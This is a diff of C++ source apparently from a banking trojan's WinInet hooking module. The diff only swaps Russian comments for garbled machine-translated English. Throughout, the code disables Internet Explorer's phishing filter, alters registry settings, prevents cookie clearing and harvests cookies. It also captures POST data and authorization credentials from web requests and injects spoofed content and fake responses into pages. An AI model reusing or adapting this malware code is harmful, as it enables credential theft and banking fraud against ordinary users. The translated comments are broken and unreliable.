@@ -24,25 +24,25 @@
 
 #if(BO_WININET > 0)
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// Таблица соединений.
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//В Connection table.
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 typedef struct
 {
-  HINTERNET handle;                     //Хэндл соединения.
-  HANDLE readEvent;                     //События чтения (при инжекте).
+  HINTERNET handle;                     //The handle of the connection.
+  HANDLE readEvent;                     //Event reading (when injected).
 
-  void *postData;                       //Подмененные POST-данные.
+  void *postData;                       //POST-spoofed data.
 
-  HttpGrabber::INJECTFULLDATA *injects; //Список ижектов, применяемых для соединения.
-  DWORD injectsCount;                   //Кол. элементов в injects.
+  HttpGrabber::INJECTFULLDATA *injects; //List izhektov used for the connection.
+  DWORD injectsCount;                   //Count. elements in the injects.
 
-  LPBYTE context;                       //Подмененное содержимое.
-  DWORD contentSize;                    //Размер содержимого. Если равно ((DWORD)-1), то данные есче не считаны.
-  DWORD contentPos;                     //Позиция в содержимом.
+  LPBYTE context;                       //Spoofed content.
+  DWORD contentSize;                    //The size of the content. If zero ((DWORD) -1), then the data esche not think so.
+  DWORD contentPos;                     //The position of the contents.
   
-  HINTERNET fakeRequest;                //Хэндл фейкового запроса.
+  HINTERNET fakeRequest;                //Handle to create fake query.
 }WININETCONNECTION;
 
 static WININETCONNECTION *connections;
@@ -76,7 +76,7 @@ static DWORD connectionAdd(HINTERNET handle)
 
   if(handle == NULL)return index;
 
-  //Ищим свободный.
+  //Ischim free.
   for(DWORD i = 0; i < connectionsCount; i++)if(connections[i].handle == NULL)
   {    
     newConnection = &connections[i];
@@ -84,14 +84,14 @@ static DWORD connectionAdd(HINTERNET handle)
     break;
   }
   
-  //Добовляем новый.
+  //Dobovlyaem new.
   if(newConnection == NULL && Mem::reallocEx(&connections, sizeof(WININETCONNECTION) * (connectionsCount + 1)))
   {
     index         = connectionsCount++;
     newConnection = &connections[index];
   }
 
-  //Заполняем.
+  //Fill.
   if(newConnection != NULL)
   {
     newConnection->handle       = handle;
@@ -137,7 +137,7 @@ static void connectionRemove(DWORD index)
   Mem::free(newConnection->context);
   if(newConnection->fakeRequest != NULL)Wininet::_closeWithParents(newConnection->fakeRequest);
 
-  //Оптимизация.
+  //Optimization.
   {
     DWORD newCount = connectionsCount;
     while(newCount > 0 && connections[newCount - 1].handle == NULL)newCount--;
@@ -154,7 +154,7 @@ static void connectionRemove(DWORD index)
   }
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 void WininetHook::init(const LPWSTR homePage)
 {
@@ -164,7 +164,7 @@ void WininetHook::init(const LPWSTR homePage)
 
   if(coreData.integrityLevel > Process::INTEGRITY_LOW)
   {
-    //Домашняя страница.
+    //Home.
     if(homePage != NULL && *homePage != 0)
     {
       CSTR_GETW(startPageValue, regvalue_ie_startpage);
@@ -173,7 +173,7 @@ void WininetHook::init(const LPWSTR homePage)
       Registry::_setValueAsString(HKEY_CURRENT_USER, startPagePath, startPageValue, homePage, Str::_LengthW(homePage));
     }
     
-    //Отключение фишинг фильтра.
+    //Disable Phishing Filter.
     {
       CSTR_GETW(key, regpath_ie_phishingfilter);
       CSTR_GETW(var1, regvalue_ie_phishingfilter1);
@@ -183,7 +183,7 @@ void WininetHook::init(const LPWSTR homePage)
       for(BYTE i = 0; i < sizeof(vars) / sizeof(LPWSTR); i++)if(Registry::_getValueAsDword(HKEY_CURRENT_USER, key, vars[i]) != 0)Registry::_setValueAsDword(HKEY_CURRENT_USER, key, vars[i], 0);
     }
   
-    //Не очищать куки при выходе из IE.
+    //Do not clear cookies on exit from IE.
     {
       CSTR_GETW(key, regpath_ie_privacy);
       CSTR_GETW(var, regvalue_ie_privacy_cookies);
@@ -194,8 +194,8 @@ void WininetHook::init(const LPWSTR homePage)
       }
     }
     
-    //Настройка Интернет-зон.
-    //FIXME: делать это через COM.
+    //Setting the Internet zone.
+    //FIXME: do it through COM.
     {
       CSTR_GETW(key, regpath_ie_zones);
       CSTR_GETW(var1, regpath_ie_zones_1406);
@@ -220,17 +220,17 @@ void WininetHook::uninit(void)
 
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// Получение кукисов.
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//В Getting the cookies.
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 enum
 {
-  COOKIESFLAG_DELETE = 0x1, //Удалить куки.
-  COOKIESFLAG_SAVE   = 0x2  //Сохранить куки.
+  COOKIESFLAG_DELETE = 0x1, //Delete cookies.
+  COOKIESFLAG_SAVE   = 0x2  //Save cookies.
 };
 
-//Размер буфера для INTERNET_CACHE_ENTRY_INFOW.
+//The buffer size for INTERNET_CACHE_ENTRY_INFOW.
 #define WININETCOOKIE_BUFFER_SIZE (sizeof(INTERNET_CACHE_ENTRY_INFOW) + INTERNET_MAX_URL_LENGTH * sizeof(WCHAR) + MAX_PATH * sizeof(WCHAR))
 
 /*
@@ -264,25 +264,25 @@ static LPSTR __inline parseWininetCookies(LPWSTR fileName)
 
         for(DWORD i = 0; i < listCount; i += 9)
         {
-          //Получем значения.
+          //Mean something.
           if((name  = list[i + 0]) == NULL || *name  == 0 ||
              (value = list[i + 1]) == NULL || *value == 0 ||
              (path  = list[i + 2]) == NULL || *path  == 0)
           {
-            //Нервеный формат.
+            //Nerveny format.
             Mem::free(output);
             output = NULL;
             break;
           }
 
-          //Добавление пути. 
+          //Adding track.
           if(Str::_CompareA(prevPath, path, -1, -1) != 0)
           {
             bufSize = Str::_sprintfA(buf, sizeof(buf), reportPathFormat, path);
             if(bufSize == -1 || !Str::_CatExA(&output, buf, bufSize)){output = NULL; break;}
           }
 
-          //Добовление кука.
+          //Dobovlenie Cook.
           {
             bufSize = Str::_sprintfA(buf, sizeof(buf), reportFormat, name, value);
             if(bufSize == -1 || !Str::_CatExA(&output, buf, bufSize)){output = NULL; break;}
@@ -374,18 +374,18 @@ static void wininetCookiesProc(DWORD flags, LPSTR *list, LPDWORD listSize)
   }
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 void WininetHook::_getCookies(void)
 {
   LPSTR cookies;
   DWORD cookiesSize;
 
-  //Получаем куки.
+  //We get a cookie.
   wininetCookiesProc(COOKIESFLAG_SAVE, &cookies, &cookiesSize);
   if(cookiesSize == 0)cookies = NULL;
 
-  //Пишим лог.
+  //Pishim log.
   {
     CSTR_GETW(header, wininethook_report_cookies);
     CSTR_GETA(empty, wininethook_report_cookies_empty);
@@ -399,9 +399,9 @@ void WininetHook::_removeCookies(void)
   wininetCookiesProc(COOKIESFLAG_DELETE, NULL, NULL);
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// Инжекты.
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//В Inject.
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
   Установка хука на InternetStatusCallback для хэндла и его родителей.
@@ -425,7 +425,7 @@ static void hookInternetStatusCallbacks(HINTERNET handle, void *hooker)
     }
     
     
-    //Получаем родителя.
+    //Obtain a parent.
     size = sizeof(HINTERNET);
     ok   = CWA(wininet, InternetQueryOptionA)(handle, INTERNET_OPTION_PARENT_HANDLE, &parentHandle, &size);
     if(ok == FALSE || parentHandle == NULL)break;
@@ -433,7 +433,7 @@ static void hookInternetStatusCallbacks(HINTERNET handle, void *hooker)
   }
 }
 
-#define READCONTEXT_BUFFER_SIZE 4096 //Буфер чтения для readAllContext().
+#define READCONTEXT_BUFFER_SIZE 4096 //Read buffer for readAllContext ().
 
 /*
   Кэллбэк для readAllContext().
@@ -471,9 +471,9 @@ static bool readAllContext(HINTERNET request, HANDLE readEvent, LPBYTE *context,
   INTERNET_STATUS_CALLBACK oldCallback;
   LPBYTE buffer;
 
-  //Создаем основные объекты.
+  //Create basic objects.
   {
-    CWA(kernel32, ResetEvent)(readEvent); //Параноя.
+    CWA(kernel32, ResetEvent)(readEvent); //Paranoia.
 
     if((buffer = (LPBYTE)Mem::alloc(READCONTEXT_BUFFER_SIZE)) == NULL)
     {
@@ -481,7 +481,7 @@ static bool readAllContext(HINTERNET request, HANDLE readEvent, LPBYTE *context,
       return false;
     }
 
-    //Подменяем данные соединения.
+    //Substitute for these compounds.
     {  
       DWORD size = sizeof(DWORD_PTR);
       oldCallback = CWA(wininet, InternetSetStatusCallback)(request, readAllContextCallback);
@@ -491,7 +491,7 @@ static bool readAllContext(HINTERNET request, HANDLE readEvent, LPBYTE *context,
     *contentSize = 0;
   }
 
-  //Читаем.
+  //Read.
   bool ok = true;
   {
     INTERNET_BUFFERSA internetBuffer;
@@ -520,23 +520,23 @@ static bool readAllContext(HINTERNET request, HANDLE readEvent, LPBYTE *context,
         break;
       }
 
-      //Весь контекст прочитан.
+      //Read the entire context.
       if(internetBuffer.dwBufferLength == 0)break;
 
-      //Выделяем память
+      //Allocate
       if(!Mem::reallocEx(context, *contentSize + internetBuffer.dwBufferLength))
       {
         ok = false;
         break;
       }
 
-      //Копируем.
+      //Copy.
       Mem::_copy(*context + *contentSize, buffer, internetBuffer.dwBufferLength);
       *contentSize += internetBuffer.dwBufferLength;
     }
   }
 
-  //Уничтожаем основные объекты.
+  //Destroy the basic objects.
   {
     CWA(wininet, InternetSetStatusCallback)(request, oldCallback == INTERNET_INVALID_STATUS_CALLBACK ? NULL : oldCallback);
     Mem::free(buffer);
@@ -583,13 +583,13 @@ static int onInternetReadFile(HINTERNET *request, void *buffer, DWORD numberOfBy
     {
       if(numberOfBytesRead != NULL)*numberOfBytesRead = 0;
 
-      //Инжект еще не применен.
+      //Inject is not applied.
       if(wc->contentSize == (DWORD)-1)
       {
         LPBYTE contextBuffer;
         DWORD contextBufferSize;
         
-        //Читаем и подменяем содержимое.
+        //Read and replaces the contents.
         bool ok;
         {
           HANDLE readEvent = wc->readEvent;
@@ -598,7 +598,7 @@ static int onInternetReadFile(HINTERNET *request, void *buffer, DWORD numberOfBy
           CWA(kernel32, EnterCriticalSection)(&connectionsCs);
         }
         
-        //Переполучаем данные соединения.
+        //Perepoluchaem data connection.
         if(ok == false || (connectionIndex = connectionFind(*request)) == (DWORD)-1)
         {
           if(ok)Mem::free(contextBuffer);
@@ -613,7 +613,7 @@ static int onInternetReadFile(HINTERNET *request, void *buffer, DWORD numberOfBy
           LPSTR url = (LPSTR)Wininet::_queryOptionExA(*request, INTERNET_OPTION_URL, &urlSize);
           if(HttpGrabber::_executeInjects(url, &contextBuffer, &contextBufferSize, wc->injects, wc->injectsCount))
           {
-            //Подменяем кэш.              
+            //Substitute for the cache.
             LPWSTR urlW = Str::_ansiToUnicodeEx(url, urlSize);
             if(urlW != NULL)
             {
@@ -642,7 +642,7 @@ static int onInternetReadFile(HINTERNET *request, void *buffer, DWORD numberOfBy
         }
       }
 
-      //Инжект применены, отдаем его результаты.
+      //Inject applied, we give the results.
       if(wc->contentSize != (DWORD)-1 && retVal == -1)
       {
         DWORD maxSize = wc->contentSize - wc->contentPos;
@@ -668,9 +668,9 @@ static int onInternetReadFile(HINTERNET *request, void *buffer, DWORD numberOfBy
   return retVal;
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// Граббер.
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//В Grabber.
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
   Заполнение HttpGrabber::REQUESTDATA.
@@ -689,10 +689,10 @@ static bool fillRequestData(HttpGrabber::REQUESTDATA *requestData, HINTERNET req
   
   requestData->flags = HttpGrabber::RDF_WININET; 
 
-  //Хэндл запроса.
+  //Handle to the query.
   requestData->handle = (void *)request;
   
-  //Получем URL.
+  //Obtain the URL.
   if((requestData->url = (LPSTR)Wininet::_queryOptionExA(request, INTERNET_OPTION_URL, &requestData->urlSize)) == NULL)
   {
 #   if defined WDEBUG0
@@ -701,10 +701,10 @@ static bool fillRequestData(HttpGrabber::REQUESTDATA *requestData, HINTERNET req
     return false;
   }
 
-  //Получем реферера.
+  //We get the referrer.
   requestData->referer = Wininet::_queryInfoExA(request, HTTP_QUERY_REFERER | HTTP_QUERY_FLAG_REQUEST_HEADERS, &requestData->refererSize, NULL);
   
-  //Получем Verb.
+  //Obtain a Verb.
   {
     char verb[10];
     DWORD verbSize = sizeof(verb) / sizeof(char) - 1;
@@ -722,17 +722,17 @@ static bool fillRequestData(HttpGrabber::REQUESTDATA *requestData, HINTERNET req
     }
   }
 
-  //Получем Content-Type.
+  //Obtain the Content-Type.
   requestData->contentType = Wininet::_queryInfoExA(request, HTTP_QUERY_CONTENT_TYPE | HTTP_QUERY_FLAG_REQUEST_HEADERS, &requestData->contentTypeSize, NULL);
   
-  //Получаем POST-данные.
+  //Obtain the POST-data.
   if(postDataSize > 0 && postDataSize <= HttpGrabber::MAX_POSTDATA_SIZE && postData != NULL)
   {
     requestData->postData     = (void *)postData;
     requestData->postDataSize = postDataSize;
   }
 
-  //Получаем данные авторизации.
+  //Obtain the authorization data.
   {
     bool ok = false;
     DWORD size;
@@ -752,7 +752,7 @@ static bool fillRequestData(HttpGrabber::REQUESTDATA *requestData, HINTERNET req
     if(!ok)Mem::free(userName);
   } 
   
-  //Текущая конфигурация.
+  //The current configuration.
   requestData->dynamicConfig = DynamicConfig::getCurrent();
   requestData->localConfig   = LocalConfig::getCurrent();
   return true;
@@ -795,7 +795,7 @@ static int onHttpSendRequest(HINTERNET request, void **postData, LPDWORD postDat
         {
           HttpGrabber::INJECTFULLDATA *fakeData = &requestData.injects[0];
 
-          //Проверяем результат.
+          //Check the results.
           if((fakeRequest = HttpGrabber::_createFakeResponse(&requestData, fakeData)) == NULL)
           {
             addInjects = false;
@@ -821,7 +821,7 @@ static int onHttpSendRequest(HINTERNET request, void **postData, LPDWORD postDat
           }
         }
         
-        //Добавляем инжекты в список.
+        //Add injected to the list.
         CWA(kernel32, EnterCriticalSection)(&connectionsCs);
         if(addInjects == false || (connectionIndex = connectionFindEx(request)) == (DWORD)-1)
         {
@@ -833,7 +833,7 @@ static int onHttpSendRequest(HINTERNET request, void **postData, LPDWORD postDat
         }
         else
         {
-          //Старые инжекты могу сущестовать, т.к. один запрос можно послать несколько раз.
+          //Old injected can suschestovat because one request can be sent several times.
           HttpGrabber::_freeInjectFullDataList(connections[connectionIndex].injects, connections[connectionIndex].injectsCount);
           Mem::free(connections[connectionIndex].context);
 
@@ -948,10 +948,10 @@ BOOL WINAPI WininetHook::hookerInternetCloseHandle(HINTERNET handle)
   WDEBUG0(WDDT_INFO, "Called");
 #endif
   
-  //Закрытие хэндла прерывает чтение данных из других потоков.
+  //Closing handle interrupts the reading of data from other streams.
   BOOL r = CWA(wininet, InternetCloseHandle)(handle);
 
-  if(Core::isActive())//Возможна небольшая утечка памяти.
+  if(Core::isActive())//Might be a memory leak.
   {
     CWA(kernel32, EnterCriticalSection)(&connectionsCs);
     DWORD connectionIndex = connectionFind(handle);
@@ -1002,7 +1002,7 @@ BOOL WINAPI WininetHook::hookerInternetQueryDataAvailable(HINTERNET handle, LPDW
   WDEBUG0(WDDT_INFO, "Called");
 #endif
 
-  if(Core::isActive()/* && numberOfBytesAvailable != NULL May be NULL.*/)
+  if(Core::isActive()/*B & & NumberOfBytesAvailable! = NULL May be NULL.*/)
   {
     int r = onInternetReadFile(&handle, NULL, 0, numberOfBytesAvailable);
     if(r != -1)return (BOOL)r;
